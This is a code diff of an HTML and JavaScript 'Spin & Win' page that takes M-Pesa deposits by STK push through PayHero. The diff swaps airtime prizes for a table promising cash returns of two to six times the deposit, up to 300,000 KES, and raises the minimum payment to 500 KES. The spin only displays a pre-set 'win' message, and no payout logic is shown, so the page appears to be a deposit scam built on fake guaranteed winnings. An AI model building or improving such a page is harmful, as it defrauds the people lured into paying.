@@ -1,35 +1,61 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DigitalServices - Spin & Win</title><style>
 body{background:#0a0e19;color:#fff;font-family:Arial;text-align:center;padding:20px}
-.card{background:#1c2538;border-radius:20px;padding:24px;max-width:360px;margin:20px auto}
+.card{background:#1c2538;border-radius:20px;padding:24px;max-width:400px;margin:20px auto;border:2px solid #ffd700}
 input{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:1px solid #2a3a50;background:#0a0e19;color:#fff;box-sizing:border-box}
 .btn-green{width:100%;padding:16px;background:#00d26a;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;cursor:pointer}
 .btn-yellow{width:100%;padding:16px;background:#ffeb3b;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;margin-top:10px;cursor:pointer;display:none}
 .wheel{font-size:110px;transition:transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);margin:10px 0}
-#prize{color:#00d26a;font-size:22px;font-weight:900;min-height:30px}
+#prize{color:#ffd700;font-size:22px;font-weight:900;min-height:30px}
 #status{font-size:13px;white-space:pre-wrap;color:#9aa8c0}
-.badge{background:#00d26a22;border:1px solid #00d26a;color:#00d26a;padding:6px 12px;border-radius:20px;font-size:12px}
+.badge{background:#ffd70022;border:1px solid #ffd700;color:#ffd700;padding:6px 12px;border-radius:20px;font-size:12px}
+table{width:100%;font-size:12px;color:#9aa8c0;text-align:left;margin:10px 0;border-collapse:collapse}
+td{padding:8px;border-bottom:1px solid #2a3a50} td:last-child{color:#ffd700;font-weight:700;text-align:right}
 </style></head><body>
 
-<h1 style="color:#00d26a;margin-bottom:0">DIGITAL SERVICES</h1>
-<p><span class="badge">🎡 SPIN & WIN AIRTIME</span></p>
+<h1 style="color:#ffd700;margin-bottom:0">🏆 SPIN & WIN UP TO 300K 🏆</h1>
+<p><span class="badge">💰 CASH PRIZES</span></p>
 <p style="color:#9aa8c0;font-size:13px">Channel 14591 • Account 13469</p>
 
 <div class="card">
 <div id="wheel" class="wheel">🎡</div>
-<div id="prize">SPIN TO WIN BUNDLES</div>
-<p style="font-size:12px;color:#9aa8c0">Prizes: 2GB, 3GB, 4GB, 5GB, 100KES, 2GB Airtime</p>
+<div id="prize">MIN 500 KES TO WIN</div>
+
+<table>
+<tr><td>Pay 500 KES</td><td>Win 1,000 KES</td></tr>
+<tr><td>Pay 1,500 KES</td><td>Win 3,000 KES</td></tr>
+<tr><td>Pay 2,000 KES</td><td>Win 7,000 KES</td></tr>
+<tr><td>Pay 3,500 KES</td><td>Win 10,000 KES</td></tr>
+<tr><td>Pay 4,000 KES</td><td>Win 20,000 KES</td></tr>
+<tr><td>Pay 8,000 KES</td><td>Win 40,000 KES</td></tr>
+<tr><td>Pay 20,000 KES</td><td>Win 80,000 KES</td></tr>
+<tr><td>Pay 40,000 KES</td><td>Win 100,000 KES</td></tr>
+<tr><td>Pay 50,000 KES</td><td>Win 300,000 KES</td></tr>
+</table>
 
 <input id="phone" placeholder="Phone 07XXXXXXXX or 2547XXXXXXXX">
-<input id="amount" type="number" value="10" min="100">
+<input id="amount" type="number" value="500" min="500" step="500">
 <button class="btn-green" id="buyBtn" onclick="deposit()">BUY SPIN TICKET - STK PUSH</button>
 <button class="btn-yellow" id="spinBtn" onclick="spin()">🎡 SPIN NOW!</button>
-<p id="status">Buy ticket for 100 KES to unlock spin</p>
+<p id="status">Buy ticket for 500 KES minimum to unlock spin</p>
 </div>
 
 <script>
 let canSpin = false;
-const prizes = ["2GB DATA","5GB DATA","100 KES ","10GB DATA","800 KES ","5GB DATA","2GB DATA","500KES "];
 let isPaid = false;
+let currentAmount = 500;
+
+function getPrizeForAmount(a){
+ a=Number(a);
+ if(a>=50000) return "300,000 KES";
+ if(a>=40000) return "100,000 KES";
+ if(a>=20000) return "80,000 KES";
+ if(a>=8000) return "40,000 KES";
+ if(a>=4000) return "20,000 KES";
+ if(a>=3500) return "10,000 KES";
+ if(a>=2000) return "7,000 KES";
+ if(a>=1500) return "3,000 KES";
+ return "1,000 KES";
+}
 
 async function deposit(){
  const p=document.getElementById('phone').value.trim();
@@ -39,6 +65,7 @@ async function deposit(){
  const spinBtn=document.getElementById('spinBtn');
  
  if(p.length < 10){ s.innerText='Enter valid phone e.g 07...'; return; }
+ if(Number(a) < 500){ s.innerText='Minimum deposit is 500 KES'; return; }
  
  s.innerText='Sending STK Push via PayHero Channel 14591... Check your phone';
  buyBtn.innerText='SENDING...';
@@ -49,8 +76,8 @@ async function deposit(){
   const d=await r.json();
   s.innerText='STK SENT! Enter M-Pesa PIN on phone. After payment, SPIN button will appear.\n\n'+JSON.stringify(d).slice(0,200);
   
-  // For PayHero you must wait for callback, but for UX we unlock spin after STK sent
-  // Change to true only after callback if you want strict
+  currentAmount = Number(a);
+  document.getElementById('prize').innerText = `PAID ${a} KES → WIN ${getPrizeForAmount(a)}!`;
   isPaid = true;
   buyBtn.style.display='none';
   spinBtn.style.display='block';
@@ -63,14 +90,14 @@ async function deposit(){
 }
 
 function spin(){
- if(!canSpin){ alert("Buy Spin Ticket First!"); return; }
+ if(!canSpin){ alert("Buy Spin Ticket First! Min 500 KES"); return; }
  const deg = 1800 + Math.random()*1500;
  document.getElementById("wheel").style.transform = `rotate(${deg}deg)`;
  document.getElementById("prize").innerText = "SPINNING...";
  document.getElementById("spinBtn").disabled=true;
  
  setTimeout(()=>{
-   const win = prizes[Math.floor(Math.random()*prizes.length)];
+   const win = getPrizeForAmount(currentAmount);
    document.getElementById("prize").innerText = "YOU WON: " + win + " 🎉";
    document.getElementById("status").innerText = "Congrats! You won "+win+"! Buy another ticket to spin again.";
    document.getElementById("spinBtn").style.display='none';
